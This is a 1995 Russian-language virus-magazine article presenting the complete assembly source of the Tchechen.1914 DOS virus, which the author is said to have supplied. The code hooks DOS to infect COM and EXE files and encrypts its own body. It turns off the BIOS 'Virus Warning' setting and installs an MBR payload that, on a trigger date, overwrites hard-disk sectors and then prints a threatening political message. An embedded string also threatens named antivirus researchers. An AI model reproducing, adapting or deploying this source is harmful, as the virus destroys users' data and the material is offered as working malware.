;     ▄▄                  █
;    ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       XII 1995
;    ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
;     ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ ▄▀▀▄ █ 
;      █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ ▄▀▀▄ █
;      █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ ▀▄▄▀ █
;      ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
;      (C) Copyright,1994-95,by STEALTH group WorldWide, unLtd.

; Предлагаю вашему вниманию вирус Tchechen.1914, любезно предоставленный 
; автором. В дикой природе существует несколько разновидностей данного 
; вируса, практически не отличающиеся друг от друга (1906,1909,1912...)
; Длина данного экземпляра зависит от числа проходов при компиляции.
; В этом номере вы также найдете усовершенствованную версию Tchechen v2.1,
; полиморфного вируса с новыми средствами защиты от запрета доступа и
; резидентных сторожей. Данная версия, несмотря на большое количество глюков,
; (а где их нет), поможет вам полнее разобраться в следующей.
; Может быть полезен для более-менее разбирающихся в вирусах, следовательно
; я старался особо его не комментировать.

; Ассемблер      - TASM 2.5 . 
; Число проходов - не имеет значения.

;┌─────────────────────────────────────────────────────────────────────────┐
;│ THE TCHECHEN VIRUS, VERSION 1.3, (C) RUSSIAN BEAR, 1995                 │
;│ Started in Russia, finished in Ukraine                                  │
;└─────────────────────────────────────────────────────────────────────────┘

.MODEL TINY		; 0721MSK 090295
			; 	  230295 Kiev
; (EOF-5)-(EOF-6)='$'=-24h

@MOV_DL EQU 0B2h

BEEP MACRO beeper
	push ax
	mov ah,0eh
	mov al,BEEPER
	int 10h
	pop ax
ENDM	

VIRPARAS equ 100h	; 4Kb	
TRASH  	 equ 100h	; Trashbuf after viR
STACKLEN equ 100h	; stacklen for com lentest
.CODE
org 100h

START0:
	jmp INIT
start:
	mov cs:[si][offset SISave+1-Start],si
WhereIam:
█ ByteHidden2:
	mov ax,04EBh		; ...And Selftest Function
	jmp $-2
	db 0E9h			; JMP to the ASS
ByteNo2 db 0CDh
SelfTest:
	sub ah,14h		; F0EBh
	int 21h
AfterCheck:
███ MemInstall:
GetMyLen:
	push ds
	push ds
	pop  bx
	dec  bx
	mov  ds,bx
	mov  bx,ds:[0003h]
	pop  ds
CutMyMem:
	sub bx,VIRPARAS+1
	mov ah,4ah
	int 21h
	jc CureInRAM
GetMYmem:
	mov bx,VIRPARAS
	mov ah,48h
	int 21h
	jc CureInRAM
						; Move body up
	push ds 
	push cs
	pop  ds
	mov  es,ax
	xor  di,di
	mov  cx,(offset EndAll-Start+1)/2	;#C09
	cld
	rep  movsw
	pop  ds
IamCOMMAND:
	push es
	mov ah,52h
	int 21h
	mov bx,es:[bx-2]
	mov es,bx
	add bx,es:[0003]
	inc bx	
	inc bx
	pop es
HideMyBlock:
	mov  ax,es
	dec  ax
	mov  es,ax	
	inc  ax
	mov  es:[0001],bx
	mov  es,ax
GetFuckinDOS:
	push ds
	push es

	push es
	pop  ds
	mov ax,3521h
	int 21h
	mov ds:[offset OldInt21-Start],bx
	mov ds:[offset OldInt21+2-Start],es
	pop es
	pop ds

█  ByteHidden3:
	mov ax,04EBh
	jmp $-2
	db  0EAh
ByteNo3	db  20h

█  NowItsMyDOS:
	add ax,2521h-04EBh		; InsteaD
█▐
	mov dx,offset MyDOS-Start
	push ds
	push es
	pop  ds
	int 21h
	pop ds
CureInRAM:
SIsave:    mov  si,0000
	   push ds
	   pop  es
Director:  jmp  short CureAsCom
CureAsCOM:
	   cld	
	   mov  di,0100h

	   KEY3BYTES EQU $+1

	   MOV  BL,00
	   mov  al,cs:[si+offset ByteNo1-Start]
	   XOR  AL,BL	
	   mov  aH,cs:[si][offset ByteNo2-Start]
	   XOR  AH,BL	
	   stosW
	   mov  al,cs:[si][offset ByteNo3-Start]
	   XOR  AL,BL		   
	   stosb		   
	   cli 
	   mov sp,0FFFEh
	   sti
	   mov ax,0100h
	   push ax
	   xor ax,ax
	   retn
CureAsEXE:

	mov ax,ds
	add ax,10h	;  0000:0000
	
	add cs:[si][offset OldCS-Start],ax
	add cs:[si][offset OldSS-Start],ax
	cli
	jmp short $+2
	db 0B8h+4	; mov sp
OldSP   dw 0000
	db 0b8h		; mov ax	
OldSS   dw 0000
	mov ss,ax
	sti
	db 0EAh
OldIP   dw 0000
OldCS   dw 0000	 	

▀▀▀▀▀▀▀ MyDOS:
IsHandled:
	cmp  ax,0F0EBh
	jne  Nxt
	POP  AX
	ADD  AX,OFFSET CUREINRAM-AFTERCHECK
	PUSH AX
	iret					
Nxt:
	cmp ax,4B00h
	je  ExecIt	
	jmp Nxt1
ExecIt:	
	push ax bx cx dx si di bp ds es

▐▐▐▐ TESTACCESS:

  	push ax bx cx dx si di es ds
	
	push cs
	pop  es

        mov si,dx	; Getting Disk Letter
	xor dx,dx	
	mov dl,[si]

	push cs
	pop  ds	

        sub dl,41h      
        cmp dl,2
        jb  Over22
	mov dl,80h      ; 80h for any logical drive C: D: ...
     Over22:
     ReadSec2:	
        mov cx,0002
        mov bx,offset DiskSector-Start
        mov ax,0201h
        int 13h
	jnc Over23
     	add sp,16
	jmp OnlyPOP
     Over23:
	cmp dl,80h
	je  OpenDoor2
   	jmp WriteSec
┌─┐
│█▐    OpenDoor2:
└─┘	db 0E9h
	dw 0000

     ReadMBR:
	mov ax,0201h
        mov bx,offset DiskSector+200h-Start
	mov cx,0001
	int 13h
	jnc TestMBR
	add sp,16
	jmp ENDTestAccess
     TestMBR: 	
	cmp byte ptr es:[bx],0FCh	; Infected ?
	jne MBRisFREE
	jmp CloseTheDoor
     MBRisFREE:

██▐█▐▌▌│ VirWarning:

    GetBIOSType:			; получить тип BIOS'а: AWARD или AMI
	mov  bp,offset BIOSnames-Start	; адрес строки имен BIOS'ов
	call ScanBIOSname		; ищем  Megatrends
	jz   AMIisIt			
	add  bp,[bp]
	inc  bp				; следующий элемент списка 
	call ScanBIOSname		; ищем  AWARD
	jz   AWARDIsIt

	jmp  EndWarning			; не AMI и не AWARD

 ;==========================================================================
 ▄▄▄ ScanBIOSname:		; 
				; а входе: bp= адрес строки имен для поиска
	push ax cx si di es ds
	mov  ax,0F000h		; начиная с BIOS'а
	mov  es,ax
	xor  di,di		; со смещения 0000

	push cs			
	pop  ds

	mov  cx,0FFFFh		; как далеко искать
     ScanBIOS:
	push di cx		; сохраним CX - есть вложенный цикл
	mov  si,bp		; начало очередной строки поиска
	inc  si			; 
	xor  cx,cx
	mov  cl,byte ptr ds:[bp] ; размер строки перед строкой, пусть думают,
				 ; что это написано на Паскале !
	repe cmpsb		; сравнивать DS:[SI] и ES:[DI]
				; до первого расхождения
	pop  cx di
	jz   ExitLoop
	inc  di			; ищем далее
	loop ScanBIOS
     ExitLoop:
	pop  ds es di si cx ax
	retn			; End of Procedure
;================================================= начать вырезку ============

				; AMERICAN TRENDS*1.000.000 
▐▐▐▐ AMIIsIt:			; 34h:  X*******    1=ENABLED 0=э энэйблэд
				; 3Eh,3Fh:  	    16 bit Checksum

	mov al,34h		; читаем порт 34H - там находится нужный бит
	out 70h,al
	jmp $+2
	in  al,71h

	test al,80h		; установлен ли Virus Warning ?	
	jz  EndWarning		; нет, это нам и нужно

	sub al,80h		; сбросим бит Virus Warning
	push ax

	mov al,34h		; запишем обратно в порт
	out 70h,al
	jmp $+2
	pop ax
	out 71h,al

CheckSum:			; Подкорректируем 16-битную контрольную сумму
				; Она хранится в портах 3Eh,3Fh.
	mov al,3Fh		; младший байт
	out 70h,al
	jmp $+2
	in al,71h
	sub al,80h		; Без Virus Warning
	pushf
	push ax

	mov al,3Fh
	out 70h,al
	jmp $+2
	pop ax
	out 71h,al

	mov al,3Eh		; старший байт	
	out 70h,al
	jmp $+2
	in  al,71h
	popf
	sbb al,0		; AL-CarryFlag (если произошел заем при вычит.)
	push ax
	
	mov al,3Eh	
	out 70h,al
	jmp $+2
	pop ax
	out 71h,al

	jmp  EndWarning

				; Если компьютер наградили AWARD'ом
▐▐▐ AWARDIsIt:			; никаких контрольных сумм !!!

	mov al,03Ch		; тут скрывается Warus Virning, т.е. наоборот
	out 70h,al	
	jmp $+2
	in  al,71h
	test al,10000000B	; Disabled=1 Enabled=0
	jnz EndWarning
      Enabled:
      SwitchOff:
	or   al,10000000B	; Единичка означает "снято" (иногда CMOS полез-
				; но не обнулять, а обьединичивать !)
	push ax
	mov al,03ch
	out 70h,al
	jmp $+2
	pop ax
	out 71h,al

▐▐▌█ EndWarning:

│▌█▐█  CountTest:
	cmp es:[bx-200h],'ИМ'
	je NowMIR
	mov es:[bx-200h],'ИМ'
	mov es:[bx-200h+2],':Р'
	mov byte ptr es:[bx-200h+4],04		; WaitCount
      NowMIR:
	dec byte ptr es:[bx-200h+4]
	jz  VotVamMir
;	cmp byte ptr es:[bx-200h+4],0
;	je  VotVamMir
	jmp WriteSec
   VotVamMir:
	mov ds:[bx-200h],'УХ'
	mov ds:[bx-200h+2],'!Й'
│▌█▐█   EndCountTest:

│▌█▐█   Possession:

   MovePartTab:
	mov si,bx
	add si,01BEh
        mov di,offset MyMBR-Start
        mov bx,di
	add di,01BEh
	push es
        pop  ds
	mov  cx,20h
	cld 
	rep movsw

   SetUpDay_X:
	push ax bx cx dx

	mov ah,04h
	int 1Ah
	jnc EvalDate
	mov dl,30h			; Error Getting date = 30th
	jmp short EndEvalDate
 EvalDate:
	cmp dl,01h	
	ja  Not01
	mov dl,30h
 Not01:	dec dl
	mov dh,dl
	and dh,0Fh
	cmp dh,0Fh
	jne EndEvalDate
	sub dl,6	
 EndEvalDate:
 
 WriteDay_X:
	mov byte ptr ds:[bx][offset DayX__+2-StartMBR],dl
	pop dx cx bx ax
  WriteMBR:
	mov ax,0301h
	inc cl			; CX=0000 after MOVSW
	int 13h
▄▄▄				
      WriteSec:			; DX must show 00.Disk
	mov ax,0301h
	mov cx,0002
	mov bx,offset DiskSector-Start
        int 13h
        pop ds es di si dx cx bx ax
	jnc EndTestAccess
	cmp dh,80h
	je  EndTestAccess
        jmp OnlyPOP

│▌█▐█   ENDPossession:  	 

▀▀▀   CloseTheDoor:
	mov word ptr cs:[offset OpenDoor2+1-Start],offset WriteSec-OpenDoor2-3
	
  ▐▐ PopExitAcc:
	pop ds es di si dx cx bx ax

▐▐▐▐ ENDtestaccess:

▓▓▓ TabooNames:

	push ax cx di es
	push ds
	pop  es

	mov  di,dx
	mov  cx,1000h
	xor  al,al
	repne scasb
	std
	mov  al,'\'
	repne scasb
	cld
	mov ax,es:[di+2]
	pop es di cx
	cmp ax,'EW'
	je  TabooIs
	cmp ax,'DA'
	je  TabooIs	
	cmp ax,'IA'
	je TabooIs
	cmp ax,'OC'
	je TabooIs
    TabooIs:				;#CHNG14
	pop ax 
	jne EndTabooNames
	jmp ExecExit

▓▓▓ EndTabooNames:

███ DiskReady:
	mov ax,3D00h
	int 21h
	jnc mmm1
	jmp  ExecExit
mmm1:
	xchg ax,bx

	push cs
	pop  ds

█ ByteHidden1:
	mov ax,03EBh
	jmp $-2
ByteNo1 db  90h	
█▐

███ ChngOpenMode:

	push bx es di
	mov ax,1220h
	push ax
	int 2fh
	mov bl,es:[di]
	pop ax
	sub ax,0Ah
	int 2fh
	
	MOV  word ptr es:[di+2],0002h
  
  SaveTime:
	mov ax,es:[di][0Dh]
	mov ds:[offset FTime_+1-Start],ax
	mov ax,es:[di][0Fh]
	mov ds:[offset FDate_+1-Start],ax

	pop di es bx

█  SelfInfTest:

	mov ax,4202h
	mov cx,0FFFFh
	mov dx,0FFFdh
	call CallDOS
	jc  tEE
mmm2:
	mov ah,3Fh
	mov cx,0003
	push cx
	mov dx,offset Original-Start
	int 21h
	pop cx
	jc tEE
mmm3:
	cmp ax,cx
	jnz tEE
mmm8:
	mov ax,ds:[offset Original-Start]
	sub ah,al
	cmp ah,24h
	je tEE
█ EndInfTest:

█  NewInfSign:			; New Infected Sign
	call GetRND		; AX=RNDnumber FF80..0079
	mov  ah,al
	sub  al,24h
	mov  cs:[offset InfSign-Start],ax
█▐ EndNewInfSign:  

SetDirector:
	mov byte ptr ds:[offset Director+1-Start],00
GetOriginal:
	call FSeek0
	jc  tEE
 mmm7:
	mov ah,3fh
	mov cx,18h
	push cx
	mov dx,offset Original-Start
	int 21h
	xchg dx,si
	pop cx
	jc tEE 
mmm6:
	sub cx,ax
	jz WhatType
tEE:	jmp ExecExit


WhatType:
	cmp [si],'ZM'
	jz  EXEisIT

███ COMisIt:		
Save3bytes:
	call GetRND
	mov byte ptr ds:[offset Key3Bytes-Start],al
	mov dx,ds:[offset Original-Start]
	xor dl,al
	xor dh,al
	mov byte ptr ds:[offset ByteNo1-Start],dl
	mov byte ptr ds:[offset ByteNo2-Start],dh
	mov dl,ds:[offset Original-Start+2]
	xor dl,al
	mov ds:[offset ByteNo3-Start],dl

	call FSeek2
LenTest:
	mov ds:[offset JmpERarg-Start],ax
	cmp ax,1000h
	jb  tEE3 
mmm323:	add ax,100h	
	mov ds:[offset VAddr_+1-Start],ax	; To Avoid $+3
	add ax,(offset TheEndAtAll-Start)+STACKLEN-100h
	jc  tEE3
FormJmp:
	add word ptr ds:[offset JmpERarg-Start],offset Init-Start-3
	
	call WriteTail
	jc  tEE3

WriteJmp:
	call FSeek0
	mov ah,40h
	mov cx,3
	push cx
	mov dx,offset JmpER-Start
	int 21h
	pop cx
	jc tEE3
mmm5:
	sub ax,cx
	
	inc word ptr ds:[offset GenCnt-Start]

tEE3:	jmp ExecExit
;----
███ EXEisIT:

IsWinEXE:
	push si

	mov ax,4200h
	xor cx,cx
	mov dx,0400h
	call CallDOS
	
	mov ah,3Fh
	mov cx,0002
	mov dx,offset Offs400-Start
	call CallDOS
	jc   NoWINexe
	
	xchg dx,si
	cmp  [si],'EN'
	pop  si
	je  tEE4		; ExecExit
	jmp short IsWinExit
NoWINexe:
	pop si
IsWinExit:

SaveHDR:
	mov ax,[si+0Eh]
	mov ds:[offset OldSS-Start],ax
	mov ax,[si+10h]
	mov ds:[offset OldSP-Start],ax
	mov ax,[si+14h]
	mov ds:[offset OldIP-Start],ax
	mov ax,[si+16h]
	mov ds:[offset OldCS-Start],ax
NewEP:
	call FSeek2

	push ax
	push dx
	div word ptr ds:[offset MUL200-Start]
	or dx,dx
	jz NoInc
	inc ax
   NoInc:
	cmp ax,[si+4]
	pop dx
	pop ax
	ja tEE4
   GoodEXE:	
	push dx
	push ax
	add ax,offset EndAll-Start
	adc dx,0
	div word ptr ds:[offset MUL200-Start]
	or dx,dx
	jz noincnow
	inc ax	
   noincnow:
	mov ds:[si+4],ax
	mov ds:[si+2],dx
	pop ax
	pop dx

	div word ptr ds:[offset MUL10-Start]
	sub ax,[si+08]
	mov ds:[offset VAddr_+1-Start],dx	; To Avoid $+3
	add dx,offset Init-Start
	mov [si+14h],dx		; IP
	add dx,offset EndAll-Init+2048d
	mov [si+10h],dx		; SP
	mov [si+16h],ax		; CS
	add ax,100h
	mov [si+0Eh],ax		; SS
	

SetDirectorCOM:
	mov byte ptr ds:[offset Director+1-Start],offset CureASEXE-Director-2
WriteBACK:
	call WriteTail
	jnc WriteHea
tEE4:	jmp ExecExit

WriteHea:
	call FSeek0

	mov ah,40h
	mov dx,offset Original-Start
	mov cx,18h
	int 21h

	inc word ptr ds:[offset GenCnt-Start]

███ ExecExit:
	mov ax,5701h
FDate_:	mov dx,0000
FTime_:	mov cx,0000
	int 21h
  	
	mov ah,3Eh
	int 21h
OnlyPOP:
	pop es ds bp di si dx cx bx ax
	jmp Nxt1
	
JmpER    db 0E9h
JmpERarg dw 0000

Nxt1:
	 db 0EAh
OldInt21 dw 0000
	 dw 0000	
MUL200   dw 0200h
MUL10    dw 0010h
FLen     dw 0000
	 dw 0000
FSize 	 dw 0000
	 dw 0000	
GenCnt   dw 0001

█ WriteTail:
        call CRYPTMASTER

	call FSeek2

	mov ah,40h
	mov cx,offset EndAll-Start
	mov dx,offset BodyPrepare-Start 	;must be previous
	int 21h
	retn
█  FSeek2:
	mov ax,4202h
	jmp short Zero0110
█  FSeek0:
	mov ax,4200h
█  Zero0110:
	xor cx,cx
	xor dx,dx
███ CALLDOS:	
	pushf
	call dword ptr ds:[offset OldInt21-Start]
	retn
███ CRYPTMASTER:

OpenAllDoors:
       mov ax,ds:[offset OpenDoor2+1-Start]
       push ax
       mov word ptr ds:[offset OpenDoor2+1-Start],0000	

       push es
RND:   xor ax,ax
       mov es,ax
       mov dx,es:[046Ch]
       mov byte ptr ds:[offset Mask_+1-Start],dl
       mov byte ptr ds:[offset MaskDis__+2-Start],dh
MovBody:
       push ds
       pop  es		

       xor si,si
       mov di,offset BodyPrepare-Start
       mov cx,offset EndAll-Start
       cld
       rep movsb
XORup: 
       mov si,offset BodyPrepare-Start
       mov cx,offset Init-Start
XORitUP:  xor byte ptr ds:[si],dl
       add dl,dh
       inc si
       loop XORitUP

       pop es
RestoreAllDoors:
       pop ds:[offset OpenDoor2+1-Start]	
       retn
██ GetRND:					
	in al,41h
	cbw
	retn
███ MYMBR:
startMBR:
                cld
                cli
                xor     ax,ax
                mov     ss,ax
                mov     sp,7C00h
                mov     si,sp
                mov     es,ax
                mov     ds,ax
                sti
                mov     di,0600h
                mov     cx,100h
                repne   movsw
                db      0EAh            ; jmp far 0:61Dh
                dw      61Dh, 0
loc_001D:       mov     si,07BEh
                mov     dx,[si]
                mov     cx,[si+2]

                mov     ax,201h
                mov     bx,7C00h
                int     13h
RussianRoulette:
                push ax cx dx
                mov ah,04
                int 1Ah
                jc LuckyUser
ClockOK:        
	DayX__: cmp dl,10h
                pop dx cx ax
                jnz HappyUser

                jmp short DigitalWarfare
LuckyUser:
                pop dx cx ax
HappyUser:
                db 0EAh
                dw 07c00h,0000
DigitalWarfare:
ReadPartition:
        GetHDParams:
                mov ah,08h
                int 13h
                and cl,03Fh
                mov ds:[offset SecsCnt_-StartMBR+1+0600h],cl
                and dh,3Fh
                mov ds:[offset HeadCnt__-StartMBR+2+0600h],dh
        ScanPartition:
                mov dl,80h
                mov si,07BEh
                mov bh,80h                      ; Address to read
        AnotherDisk:
                mov dh,[si+1]
                mov cx,[si+2]
                mov di,10                       ; TrackCount
        ReadTrack:
                SecsCnt_ label byte             ; Does CX,DX the same nexttime?
;======= DANGER ! DANGER ! DANGER !
		MOV AX,0300H			; WARTIME LINE: DAMAGE SECTORS
;;;;;;;;;;;;;;;	mov ax,0200h			; TEST VARIANT: read sectors
;===================================
                int 13h                 
        NextHead:
                inc dh
                HeadCnt__ label byte
                cmp dh,00
                jbe ReadTrack
        NextTrack:
                xor dh,dh               ; since ZeroHead
                inc ch
                jnc m1
                add cl,00100000B        ; Tracks are CH(LowByte) and CL(Hi765Bits)
        m1:     dec di
                jnz ReadTrack
        NextDisk:
                add si,10h
                cmp si,07FEh
                je  Done
                cmp byte ptr [si],0
                je  NextDisk
                jmp AnotherDisk
        Done:
        SayEmAll:
                mov ah,0Eh
                mov si,offset CryptoText-StartMBR+0600h
                mov cx,offset EndText-CryptoText
        NextLetter:
                lodsb
;               xor al,40h
                int 10h 
                loop NextLetter
                cli
                hlt

CryptoText db ' POLITICAL PRO$TITUTE$ OF THE WORLD, (UN)ITE !',0dh,0ah,0Dh,0Ah
           db ' IN REWARD FOR THE SCORCHED EARTH OF TCHECHNYA.',0dh,0ah
           db ' ENJOYIN'' WAR BY TV YOU''RE GLAD -YOUR ASS IS SO FAR FROM.',0dh,0ah
           db ' WAIT, YOU''LL SEE THE REAL BLOOD SOON..RIGHT AT YOUR WINDOW',0dh,0ah
           db ' AND YOU WORTH IT !!!',0dh,0ah
           db ' The Tchechen,(C)RUSSIAN BEAR,1995.'
EndText: 

FreeSpace       db      (446-(offset FreeSpace-StartMBR)) dup(0)

PartTable:      db      80h, 01h, 01h, 00h, 06h, 04h            
                db      0D1h,0CFh, 11h, 00h, 00h, 00h
                db      0FFh, 43h, 01h
                db      49 dup (0)
Signature       db      55h,0AAh
EndAllMBR:

███ NotDisplayed:
	 db 'Данилов и Лоз! Убьете-похороню ваше г и г ваших юзеров!!! '

      BIOSNames       db  10	
      AMIString	      db  'Megatrends'
		      db  5	
      AWARDStr	      db  'AWARD'			  	

███ INIT:
 VAddr_:	    mov si,offset Start
	    push si
	    mov cx,offset Init-Start
 Convaier:
	    jmp $+2
	    mov cs:[si][offset Mask_-Start],00EBh+(offset ExitAway-Convaier-11)*100h
 Mask_:     mov dl,00
 FoolWEB:
	    push es dx
	    xor ax,ax
	    mov es,ax
	    mov es:[0200h],dx
	    xor dx,dx
	    xchg dx,es:[0200h]
	    pop ax es		
	    cmp ax,dx
	    jnz ExitAway
 XORloop:   xor byte ptr cs:[si],dl
 MaskDis__:  add dl,00
	    inc si	
 ZaLoop:    loop XORloop
	    pop si	
 BackConvaiered:  mov byte ptr cs:[si][offset Mask_-Start],@MOV_DL
	    jmp Start
 ExitAway:  int 20h

InfSign  db 14h,38h,00
█▐ EndAll:
█▐ OutSideData:
Original db 3 dup(?)
DiskSector:
EXEhdrCont   db 15h dup(?)
Offs400	     dw ? 	
BodyPrepare  db (offset EndAll-Start) dup(?)
TheEndAtAll:
end start0
; ─────────────────────────────────────────────────────────────────────────
; ──────────────── Remember Where You Saw This Phile First ────────────────
; ───────[=] ARRESTED DEVELOPMENT +31.77.3547477 The Netherlands [=]───────
; ─────────────────────────────────────────────────────────────────────────
